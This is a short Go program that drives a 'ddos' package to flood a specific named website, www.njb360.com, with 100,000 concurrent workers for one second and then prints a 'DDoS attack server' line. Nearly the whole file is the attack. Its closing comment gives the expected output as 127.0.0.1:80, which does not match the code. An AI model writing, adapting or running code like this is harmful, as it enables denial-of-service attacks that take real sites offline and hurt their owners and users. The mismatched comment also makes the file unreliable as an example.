package main

import (
	"./ddos"
	"fmt"
	"time"
)

func main() {
	workers := 100000
	d, err := ddos.New("http://www.njb360.com/", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Println("DDoS attack server: http://www.njb360.com/\n")
	// Output: DDoS attack server: http://127.0.0.1:80
}
